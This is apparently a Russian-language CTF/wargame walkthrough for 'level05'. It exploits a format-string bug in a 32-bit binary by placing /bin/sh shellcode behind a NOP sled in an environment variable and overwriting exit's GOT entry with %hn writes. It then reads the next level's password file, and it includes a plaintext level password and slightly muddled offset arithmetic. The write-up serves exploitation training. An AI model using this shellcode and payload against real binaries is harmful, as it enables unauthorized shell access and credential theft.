1. Логинимся level05:3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

2. Инвестигейшн. 
Программа делает буквы маленькими. Две ошибки в этой программе:
 - printf не защищён и позволяет нам совершить **a format string attack**
 - и в конце вызывается exit, адрес этой функции мы можем подменить.

3. Мы можем закинул shellCode в env переменные и заменить адрес exit функции в GOT на адресс shellCode.
Адрес функции можем быть большим в int и будет сложно вписать его через %n, поэтому будем использовать %hn.

4. Для эксплойта будем использовать этот shellCode
```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```
5. Добавляем эксплоит в переменную начало заполняем no op инструкцие делать ничего
```
env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb level05
```
6. Запускаем программу, и смотрим примерный адрес нашего эксплоита.
```
start
x/200s environ
0xffffdd21
```

7. Найдём адрес exit в GOT. (0x80497e0)
```
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt
(gdb) x/i 0x08048370
   0x8048370 <exit@plt>:        jmp    *0x80497e0
   ;0x80497e0
```

8.Теперь адрес нашей env переменной нужно вписать в exit.
Переведём нашу строку в нашу формальную строку
4294957181 слишком много разобьём на два
0xffffdd21 = dd21 56601(56609 - 8 (2 адреса вначале)) and ffff 8926(65535 - 56609(все символы до этого))
```

9. Где делать подмену для prinf?
printf ожидает увидеть payload на 10 позиции стека
```
x/s $esp+0x28
0xffffd698:      "dsgsdg\n"
>>> 0x28
40
>>> 40/4 # %n рассматривает инты, поэтому нам нужно разделить на 4
10
```

10. Готовим наш пейлоад, как мы подменим адресс функции exit в GOT table.
```
"exit addr first 2" + "exit addr last 2" + "what to write in first 2" + "what to write in last 2" 
python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%56601d" + "%10$hn" + "%8926d" + "%11$hn"'
```

11. Соединяем вместе два решения и запускаем
```
(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%56601d" + "%10$hn" + "%8926d" + "%11$hn"';cat) | env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05
```

12. Забираем пароль 
```
cat /home/users/level06/.pass
```